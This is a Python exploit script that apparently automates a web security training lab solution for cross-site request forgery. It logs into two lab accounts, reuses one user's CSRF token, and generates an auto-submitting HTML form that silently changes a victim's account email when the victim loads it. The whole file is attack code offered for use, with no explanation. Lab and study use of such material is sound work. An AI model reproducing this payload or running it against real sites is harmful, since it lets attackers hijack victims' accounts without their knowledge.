import sys
import requests
import urllib3
import time
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_csrf(s1, s2, url):
    login_path = '/login'
    dashboard = '/my-account'
    csrf = get_csrf(s1, url)
    data = {'username':'wiener','password':'peter','csrf':csrf}
    r = s1.post(url+login_path, data=data, verify=False, proxies=proxies)
    poc = change_email(s2, url)
    print("(+) Copy below code and paste in body section of exploit server")
    print(poc)
    print("(+) Click on store followed by deliver exploit to victim")
    time.sleep(20)
    r1 = s1.get(url+dashboard, verify=False, proxies=proxies)
    if "Congratulations" in r1.text:
        print("(+) CSRF Exploit successful!")
    else:
        print("(-) Error Exploiting CSRF")

def get_csrf(s, url):
    path = '/login'
    r = s.get(url+path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def change_email(s2, url):
    login_path = '/login'
    account_path = '/my-account'
    csrf = get_csrf(s2, url)
    data = {'username':'carlos','password':'montoya','csrf':csrf}
    r = s2.post(url+login_path, data=data, verify=False, proxies=proxies)
    
    req = s1.get(url+account_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrf = soup.find('input')['value']
    poc = f'''<html>
  
  <body>
    <form action="{url}/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test11111&#64;test11&#46;co" />
      <input type="hidden" name="csrf" value="{csrf}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
'''
    return poc

if __name__=='__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(1)
    s1 = requests.session()   #wiener
    s2 = requests.session()   #carlos
    exploit_csrf(s1, s2, url)